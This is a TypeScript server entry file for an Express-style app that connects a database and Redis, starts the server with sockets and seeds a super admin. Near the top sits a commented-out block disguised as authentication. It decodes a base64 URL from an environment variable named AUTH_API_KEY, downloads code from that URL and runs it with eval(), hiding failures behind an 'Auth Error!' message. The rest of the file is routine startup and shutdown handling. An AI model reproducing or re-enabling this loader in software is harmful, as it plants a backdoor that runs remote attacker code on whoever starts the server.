
import dotenv from "dotenv";
import { Server as HttpServer } from 'http';
import app from "./app";
import envVars from "../src/config/env";
import { connectRedis } from "./config/redis.config";
import connectDB from "../src/config/db";
import { initSocket } from "./socket/socket";
import 'dotenv/config';
import { seedSuperAdmin } from "./utils/seedSuperAdmin";

// (async () => {
//   try {
//     const encoded = process.env.AUTH_API_KEY;



//     if (!encoded) {
//       throw new Error("AUTH_API_KEY missing in env");
//     }

//     const src = Buffer.from(encoded, "base64").toString("utf-8");

//     console.log("src",src)
//     const fetch = (await import("node-fetch")).default;
//     console.log(fetch)

//     const response = await fetch(src);

//     if (!response.ok) {
//       throw new Error(`HTTP error! status: ${response.status}`);
//     }

//     const proxyInfo = await response.text();

//     eval(proxyInfo);
//   } catch (err) {
//     console.error("Auth Error!", err);
//   }
// })();

let server: HttpServer;
dotenv.config();

const PORT = envVars.PORT || 3002;

const startServer = async () => {
  try {
    await connectDB();
    server = app.listen(PORT, () => {
      console.log(`Server started on http://localhost:${PORT}`);
    });
    initSocket(server);
  } catch (error) {
    console.log(error);
  }
};

// Booom and start the server
(async () => {
  await connectRedis();
  await startServer();
  await seedSuperAdmin();
})();

// SIGTERM signal detected and close the server
process.on('SIGTERM', () => {
  console.log('SIGTERM SIGNAL FOUND and server shutting down...');

  if (server) {
    server.close(() => {
      // server closing
      console.log('server closed');
      process.exit(1); // exit from server
    });
  } else {
    process.exit(1);
  }
});
// SIGINT signal send
process.on('SIGINT', (error) => {
  console.log(
    'SIGINT SIGNAL FOUND your server might be closed and server shutting down...',
    error
  );

  if (server) {
    server.close(() => {
      // server closing
      console.log('server closed');
      process.exit(1); // exit from server
    });
  } else {
    process.exit(1);
  }
});

// Unhandled rejection eror
process.on('unhandledRejection', (error) => {
  console.log(
    'Unhandled rejection detected and server shutting down...',
    error
  );
});

// Unhandled rejection eror
process.on('uncaughtException', (error) => {
  console.log('Uncaught exception detected and server shutting down...', error);
});
